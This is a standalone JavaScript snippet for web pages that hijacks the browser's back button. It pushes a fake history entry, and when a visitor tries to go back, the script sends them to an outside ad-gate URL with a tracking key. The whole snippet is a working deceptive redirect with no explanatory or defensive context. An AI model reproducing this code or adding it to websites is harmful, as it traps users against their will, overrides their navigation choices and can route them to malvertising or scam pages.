(function(window, location) { 
history.replaceState(null, document.title, location.pathname+"#!/history"); 
history.pushState(null, document.title, location.pathname); 
 
window.addEventListener("popstate", function() { 
  if(location.hash === "#!/history") { 
    history.replaceState(null, document.title, location.pathname); 
    setTimeout(function(){ 
      location.replace("https://www.highperformancecpmgate.com/nfcxhx5fd8?key=415d39a54971d9bad8e7afeeed755306"); 
    },10); 
  } 
}, false); 
}(window, location));
